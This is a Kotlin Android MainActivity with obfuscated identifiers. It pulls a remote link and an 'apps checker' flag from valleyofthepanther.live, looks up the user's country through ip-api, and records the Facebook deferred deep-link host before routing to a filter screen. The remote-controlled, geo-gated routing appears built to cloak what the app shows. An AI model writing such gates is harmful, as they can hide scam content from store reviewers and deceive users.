package com.deuscraft.Tu

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.deuscraft.Tu.NaaaaameClass.Companion.hyhycountryCodefrrfr
import com.deuscraft.Tu.NaaaaameClass.Companion.gthygeomeo
import com.deuscraft.Tu.databinding.ActivityMainBinding
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {


    private suspend fun getDataDev() {

        val frrrr = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://valleyofthepanther.live/")
            .build()
            .create(ServiceApieee::class.java)
        val frfrrfgr = frrrr.juiioioo().body()?.njjuuiiii.toString()
        val gyhyhy = frrrr.juiioioo().body()?.appsCheckergtgtt.toString()
        val frgtgttg = frrrr.juiioioo().body()?.hnhj.toString()


        Hawk.put(NaaaaameClass.linkfrrryh, frfrrfgr)
        Hawk.put(NaaaaameClass.gtgttappsCheckfrr, gyhyhy)
        Hawk.put(gthygeomeo, frgtgttg)

    }

    private lateinit var bindMainActfrr: ActivityMainBinding




    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        bindMainActfrr = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainActfrr.root)

        frgtttg(this)

        val frfrrr = Executors.newSingleThreadScheduledExecutor()
        var ffgtgtt: String? = Hawk.get(hyhycountryCodefrrfr, null)
        var jukikloo: String? = Hawk.get(gthygeomeo, null)
        frfrrr.scheduleAtFixedRate({
            if (ffgtgtt != null && jukikloo != null) {
                frfrrr.shutdown()
                gttgtth()
            } else {
                ffgtgtt = Hawk.get(hyhycountryCodefrrfr)
                jukikloo = Hawk.get(gthygeomeo)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            frfrrfrf
        }
    }




    private val frfrrfrf: Job = GlobalScope.launch(Dispatchers.IO) {
        gtggtgt()
        getDataDev()
    }

    private suspend fun gtggtgt() {
        val gtgtgtgtgt = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceApieee::class.java)
        val retData = gtgtgtgtgt.hyhyhhyhdf().body()?.bbnbmj

        Hawk.put(hyhycountryCodefrrfr, retData)
    }

    private fun gttgtth() {
        val frfrgrt = Intent(this@MainActivity, FirFilteeerActivity::class.java)
        startActivity(frfrgrt)
        finish()
    }

    fun frgtttg(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val popopop = appLinkData.targetUri.host.toString()
                Hawk.put(NaaaaameClass.hyyDEEPLfrfr, popopop)
            }
            if (appLinkData == null) {
            }
        }
    }
}